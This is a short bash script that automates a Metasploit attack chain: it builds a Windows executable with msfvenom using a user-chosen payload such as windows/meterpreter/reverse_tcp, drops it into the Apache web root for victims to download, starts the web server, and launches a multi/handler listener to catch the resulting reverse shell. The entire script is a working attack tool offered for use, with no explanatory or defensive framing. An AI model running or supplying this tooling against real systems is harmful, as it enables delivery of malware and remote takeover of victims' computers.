#!/bin/bash
clear
echo "************************************************"
echo " Windows EXE  BINARY GENERATOR FOR METASPLOIT    *"
echo "************************************************"
IP=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
port=8080
#echo "Using IP address... $IP"
#echo -en "What is the port number on your listener? Please type it and press [Enter]: "
#read port
echo -en "What payload do you want to use? e.g. windows/meterpreter/reverse_tcp: "
read pload
echo -en "What is the name of the file?: "
read name
echo -en "What is the extension of the file?: "
read type
echo -en "...building binary with msfvenom"
ext=""
if [ "$type" == "exe" ];then 
	ext=".exe"
fi
echo -en "\n"
echo -en "Using the following configuration:\n"
echo -en "IP       : $IP\n"
echo -en "PORT     : $port\n"
echo -en "PAYLOAD  : $pload\n"
echo -en "NAME     : $name\n"
echo -en "TYPE     : $type\n"
echo -en "EXTENSION: $ext\n"
echo ""
msfvenom -p $pload LHOST=$IP LPORT=$port -f $type > /var/www/html/$name"$ext"
echo $name" binary generated.."
ls -la /var/www/html/$name"$ext"
echo "...starting apache2 webserver"
service apache2 start
echo "...server running..."
echo "...starting msfconsole on IP $IP on port $port with payload $pload"
msfconsole -x "use exploit/multi/handler; set PAYLOAD $pload; set LHOST $IP; set LPORT $port; exploit"



